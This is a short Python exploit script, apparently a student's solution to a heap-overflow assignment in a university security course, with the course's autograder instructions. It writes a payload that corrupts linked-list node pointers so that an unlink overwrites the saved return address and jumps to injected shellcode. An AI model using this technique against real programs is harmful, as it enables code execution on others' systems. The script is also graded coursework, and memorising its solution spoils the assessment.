#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack


######## IMPORTANT: READ THIS FIRST ########

# Heap addresses are sometimes different across different CS461/ECE422 virtual
# machines. So, in order to let the autograder know the structure of your heap,
# you MUST fill in the values of the A, B, and C node pointers below.

# Further, ANY heap address in your solution (addresses beginning with
# 0x080d....) MUST be given as an offset from the node A, B, or C variables.
# This will allow the autograder to account for differences in your heap
# addresses. If you do not fill in these addresses or you hard code heap
# addresses (in any format), your solution may fail to validate on the
# autograder, and you may lose credit, even if your solution works on your VM.

# NOTE: When you pass your 3 inputs to your program, they are stored in memory
# inside of argv, but these addresses will be different then the addresses of
# these 3 nodes on the heap. Ensure you are using the heap addresses here, and
# not the addresses of the 3 arguments inside argv.

node_a = 0x80dd2f0
node_b = 0x80dd320
node_c = 0x80dd350

# Constants
ebp = 0xfffeec48
jmp_pc_plus8 = b"\xEB\x06\x90\x90" # jmp 0x8; nop; nop;
dist_b_a = node_b - node_a
dist_c_b = node_c - node_b

# Use A.data to detatch B from C
sys.stdout.buffer.write(b"A" * (dist_b_a - 8)) # Garbage until B.prev
sys.stdout.buffer.write(pack("<I", node_a)) # B.prev = &A
sys.stdout.buffer.write(pack("<I", node_a)) # B.next = &A
sys.stdout.buffer.write(b" ") # Next arg

# Use B.data to modify C pointers
sys.stdout.buffer.write(b"A" * (dist_c_b - 8)) # Garbage until C.prev
sys.stdout.buffer.write(pack("<I", node_c + 8)) # C.prev = C.data
sys.stdout.buffer.write(pack("<I", ebp + 4)) # C.next = &ret_addr
sys.stdout.buffer.write(b" ") # Next arg

# Use node C.data to store shellcode
sys.stdout.buffer.write(jmp_pc_plus8)
sys.stdout.buffer.write(b"A" * 4)
sys.stdout.buffer.write(shellcode)

